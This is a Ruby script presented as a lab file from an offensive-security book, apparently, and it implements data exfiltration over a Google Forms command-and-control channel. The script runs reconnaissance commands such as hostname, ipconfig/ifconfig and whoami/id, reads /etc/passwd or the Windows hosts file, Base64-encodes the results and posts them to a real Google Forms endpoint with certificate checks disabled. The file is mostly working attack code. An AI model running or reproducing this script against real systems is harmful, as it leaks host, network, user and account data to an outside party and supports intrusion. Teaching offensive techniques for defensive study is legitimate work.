#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
# 
# Author: 
#   Sabri Hassanyah | @KINGSABRI
# Description: 
#   A C2 way to exfiltrate data to Google forms
# Requirements: 
#   none
# 
require 'net/http'
require 'openssl'
require 'securerandom'
require 'base64'

proxy_addr = 'localhost'
proxy_port = 8080
proxy_user = nil
proxy_pass = nil 

# https://docs.google.com/forms/d/e/1FAIpQLSeaFvSvLlfzcvle1klpoUduWDjJF4u79NoCH3DWqZLJrQGH3g/viewform
uri = URI.parse("https://docs.google.com/forms/d/e/1FAIpQLSeaFvSvLlfzcvle1klpoUduWDjJF4u79NoCH3DWqZLJrQGH3g/formResponse")
http = Net::HTTP.new(uri.host, uri.port)
# http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port, proxy_user, proxy_pass)
http.use_ssl     = true if uri.scheme == 'https'
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

req = Net::HTTP::Post.new(uri.request_uri)
req["Content-Type"] = "application/x-www-form-urlencoded"

c2_uuid  = SecureRandom.uuid
hostname = `hostname` 
domain   = Gem.win_platform? ? `wmic computersystem get domain` : `domainname`
network  = Gem.win_platform? ? `ipconfig /all`                  : `ifconfig -a`
username = Gem.win_platform? ? `whoami /all`                    : `id`
data     = Gem.win_platform? ? open('C:\Windows\System32\drivers\etc\hosts').read : open('/etc/passwd').read

form_data = {
  "entry.339753981" => c2_uuid,
  "entry.707429881" => hostname,
  "entry.882244461" => domain,
  "entry.142083639" => network,
  "entry.589877411" => username,
  "entry.734825846" => Base64.encode64(data)
}
req.set_form_data(form_data)

res = http.request(req)
puts "[+] Data has been exfiltrated!" if res.code == '200'
